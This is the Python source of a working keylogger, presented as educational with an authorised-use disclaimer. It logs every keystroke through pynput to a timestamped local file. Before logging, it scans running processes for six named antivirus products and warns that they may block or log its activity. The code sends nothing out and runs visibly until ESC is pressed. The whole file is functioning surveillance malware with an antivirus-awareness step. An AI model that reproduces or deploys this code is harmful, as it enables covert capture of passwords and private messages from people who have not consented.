# keylogger.py

"""
Educational Keylogger Implementation with Antivirus Detection
Author: Kshitij
Disclaimer: This script is for educational and ethical testing purposes only.
Unauthorized use on devices you do not own is illegal.
"""

from pynput import keyboard
import os
from datetime import datetime
import subprocess

# === Setup log directory ===
log_dir = "logs"
if not os.path.exists(log_dir):
    os.makedirs(log_dir)

log_file = os.path.join(log_dir, f"keylog_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt")

# === Function to detect and alert on common antivirus processes ===
def detect_av_processes():
    av_processes = [
        "MsMpEng.exe",     # Windows Defender
        "avp.exe",         # Kaspersky
        "avg.exe",         # AVG
        "avastui.exe",     # Avast
        "mcshield.exe",    # McAfee
        "nortonsecurity.exe"  # Norton
    ]

    try:
        tasklist = subprocess.check_output("tasklist", shell=True).decode()
        found_avs = [proc for proc in av_processes if proc.lower() in tasklist.lower()]

        if found_avs:
            alert = "\n".join([f"  • {av}" for av in found_avs])
            console_box = f"""
==================== ⚠️  ANTIVIRUS DETECTED ⚠️ ====================
The following antivirus processes were found running on this system:
{alert}
Proceed with caution. AV software may block or log keylogger activity.
===================================================================
"""
            print(console_box)
        else:
            print("[+] No known antivirus processes detected.")

        return found_avs

    except Exception as e:
        print(f"[ERROR] AV scan failed: {e}")
        return [f"Error detecting AV: {e}"]

# === Function to log keystrokes ===
def write_to_file(content):
    with open(log_file, "a") as f:
        f.write(content)

# === Keyboard callbacks ===
def on_press(key):
    try:
        write_to_file(f"{key.char}")
    except AttributeError:
        if key == key.space:
            write_to_file(" ")
        elif key == key.enter:
            write_to_file("\n")
        else:
            write_to_file(f" [{key.name}] ")

def on_release(key):
    if key == keyboard.Key.esc:
        print("\n[INFO] Stopping keylogger...")
        return False

# === Start of Script ===
print("[INFO] Keylogger started... Press ESC to stop.")
write_to_file("\n=== Keylogger Session Started ===\n")
write_to_file(f"Timestamp: {datetime.now()}\n\n")

avs = detect_av_processes()
write_to_file("--- Antivirus Detection ---\n")
if avs:
    for av in avs:
        write_to_file(f"Detected: {av}\n")
else:
    write_to_file("No common antivirus software found.\n")

write_to_file("\n--- Keystroke Logging ---\n")

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
